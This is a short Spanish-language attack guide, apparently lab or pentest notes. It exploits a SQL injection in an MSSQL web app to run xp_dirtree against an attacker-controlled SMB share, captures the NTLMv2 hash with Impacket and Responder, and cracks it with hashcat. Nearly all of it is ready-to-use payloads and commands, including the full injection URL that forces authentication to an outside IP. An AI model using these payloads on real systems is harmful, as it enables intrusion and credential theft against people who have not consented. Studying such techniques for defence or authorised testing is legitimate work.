# Explotación de SQL Injection en MSSQL para Obtención de Hash NTLMv2 mediante xp_dirtree

Este ataque aprovecha una vulnerabilidad de **SQL Injection** en MSSQL para realizar una autenticación SMB a un servidor local, lo que nos permite capturar un hash NTLMv2 del usuario. Posteriormente, el hash puede ser crackeado por fuerza bruta.

## Procedimiento

### 1. Verificar Vulnerabilidad SQL Injection

Identificar un parámetro vulnerable a SQL Injection en el servidor web, como por ejemplo:

```
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=36
```

### 2. Utilizar `xp_dirtree` para Intentar Autenticación SMB

Ejecutar la siguiente inyección SQL para concatenar la ejecución de `xp_dirtree` y realizar un intento de autenticación SMB:

```sql
EXEC master..xp_dirtree '\\10.10.14.21\smbserver\'
```

Donde `10.10.14.21` es nuestra IP local y `smbserver` es el recurso compartido en el servidor SMB.

### 3. Payload SQL Injection

El payload completo de SQL Injection sería:

```
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=36; EXEC master..xp_dirtree '\\10.10.14.21\smbserver\'; --
```

### 4. Levantar un Servidor SMB con Impacket

Levantar un servidor SMB en nuestra máquina local para capturar la autenticación utilizando Impacket:

```bash
impacket-smbserver.py smbserver /path/to/share -smb2support
```

### 5. Capturar el Hash NTLMv2

Usar **Responder** para capturar el hash NTLMv2 de la autenticación:

```bash
responder -I eth0
```

### 6. Crackear el Hash NTLMv2

Usar **Hashcat** para crackear el hash NTLMv2 capturado:

```bash
hashcat -m 5600 hash.txt wordlist.txt
```

Este ataque permite la obtención de credenciales mediante una **SQL Injection** y la interceptación de autenticaciones SMB.
